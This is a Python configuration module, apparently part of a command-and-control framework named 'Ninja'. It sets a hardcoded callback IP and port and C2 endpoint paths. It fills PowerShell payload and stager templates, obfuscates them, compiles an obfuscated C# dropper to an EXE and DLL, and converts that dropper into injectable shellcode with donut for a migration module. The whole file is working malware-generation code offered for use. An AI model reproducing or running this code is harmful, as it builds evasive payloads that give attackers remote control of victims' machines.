# Embedded file name: core\config.py
from core.Encryption import generate_key
from core.Obfuscate import *
import os, base64, random, codecs, glob, readline, re
from Crypto import Random
import subprocess
import string
import core.config
import donut

PORT = '50025'
VERSION = '2.0'
AGENTS = dict()
COMMAND = dict()
TIME = dict()
COUNT = 0
HOST='51.68.215.173'
BASE = 'Ninja'
POINTER = 'main'
PAYLOADS = []
SSL=False
CERT=''
KEY=''
KDATE="13/06/2021"
beacon='3'
#AESKey="+4hOi8+xxOki+Mg9Y4+GuD7g7n2eytMa5KF6zNnaPz0="
AESKey=base64.b64encode(bytearray("".join([random.choice(string.ascii_uppercase) for i in range(32)]), "UTF-8")).decode()

raw_payload='/svce'
b52_payload='/oracle'
b64_stager='/wsil'
b52_stager='/ws4ee'
hjf_payload='/webservice'
b64_payload='/uddigui'
hjfs_payload='/jbossws'
sct_payload='/wsdl'
hta_payload='/axis'
register_url='/query'
download_url='/index'
upload_url='/services'
image_url='/inspection'
command_url='/names'
result_url='/uddisoap'
modules_url='/methods'


def PAYLOAD():
    global HOST
    global PORT
    fp = open('agents/payload2.ps1', 'r')
    ps1 = fp.read()
    if SSL==True:
        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "https").replace('{DATE}', KDATE)
    else :
        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "http").replace('{DATE}', KDATE)
    payload= open('payloads/raw_payload.ps1', 'w')
    payload.write(ps1)
    payload.close()
    return ps1

def STAGER():
    global HOST
    global PORT
    fp = open('agents/stager.ps1', 'r')
    ps1 = fp.read()
    if SSL==True:
        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload).replace('{HTTP}', "https")
    else:
        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{b64payload}', b64_payload).replace('{HTTP}', "http")
    payload= open('payloads/base64_stager.ps1', 'w')
    payload.write(ps1)
    payload.close()
    return ps1

def cspayload():
    fp = open('agents/simple_dropper.ninja', 'r')
    fpo= open('payloads/cs_dropper.cs', 'w')
    cs = fp.read()
    if SSL==True:
        cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}', csobf(b64_stager)).replace('{http}', csobf("https://"))
    else:
        cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}', csobf(b64_stager)).replace('{http}', csobf("http://"))

    fpo.write(cs)
    fpo.close()
    fp.close()
    exe="mono-csc -r:lib/System.Management.Automation.dll payloads/cs_dropper.cs -out:payloads/dropper_cs.exe -target:exe -warn:2"
    dll="mono-csc -r:lib/System.Management.Automation.dll payloads/cs_dropper.cs -out:payloads/dropper_cs.dll -target:library -warn:2"
    try:
        subprocess.check_output(dll, shell=True)
        print ("C# Dropper DLL written to: payloads/payload_cs.dll")
    except Exception as e:
        print ('[-] ERROR generating csharp payload : %s' % str(e))
    try:
        subprocess.check_output(exe, shell=True)
        print ("C# Dropper EXE written to: payloads/dropper_cs.exe")
    except Exception as e:
        print ('[-] ERROR generating csharp payload : %s' % str(e))

def obfuscate():
    global obfuscated
    #cmd="""pwsh -c \"./Out-ObfuscatedStringCommand.ps1;Out-ObfuscatedStringCommand -Path payloads/raw_payload.ps1 -ObfuscationLevel 3 > payloads/payload-obf.ps1\" """
    #cmd="""pwsh -c \"Import-Module ./lib/Invoke-Obfuscation/Invoke-Obfuscation.psd1;Out-EncodedBinaryCommand -Path payloads/raw_payload.ps1 -NoProfile -NonInteractive -PassThru > payloads/payload-obf.ps1\" """
    try:
        #subprocess.check_output(cmd, shell=True)
        f=open("payloads/raw_payload.ps1","rb")
        payload=f.read()
        f=open("payloads/payload-obf.ps1","w")
        f.write(obfvar(payload.decode("UTF-8")))
        f.close()
        print("obfuscated payload written to: payloads/payload-obf.ps1")
        #obfuscated=True
    except Exception as e:
        print ('[-] ERROR generating obfuscated payload : %s' % str(e))


def Obfuscated_PAYLOAD():
    f=open("payloads/raw_payload.ps1","rb")
    payload=f.read()
    return obfvar(payload.decode("UTF-8"))
    """
    if obfuscated==True:
        f=open("payloads/payload-obf.ps1","rb")
        payload=f.read()
        return payload
    else:

        return obfuscate()
    """


def migrator():
    shellcode=donut.create(file="payloads/dropper_cs.exe")
    fp = open('agents/Migrator.ninja', 'r')
    temp = fp.read()
    temp=temp.replace('{shellcode}',base64.b64encode(shellcode).decode("utf-8")).replace('{class}',"".join([random.choice(string.ascii_uppercase) for i in range(5)]))
    output=open('Modules/Migrator.ps1', 'w')
    output.write(temp)
    output.close()

def csobf(str):
    d=""
    for i in str:
        d=d+chr((ord(i)+10)^50)
    return base64.b64encode(bytearray(d,"UTF-8")).decode("UTF-8")

def set_port(in_port):
    global PORT
    PORT = in_port


def set_count(in_count):
    global COUNT
    COUNT = in_count


def set_pointer(in_pointer):
    global POINTER
    POINTER = in_pointer


def set_ip(in_ip):
    global HOST
    HOST = in_ip


def set_time(id, in_time):
    TIME[id] = in_time - TIME[id]

def get_pointer():
    global POINTER
    return POINTER

def set_key():
    global AESKey
    AESKey=generate_key()
    #print  AESKey
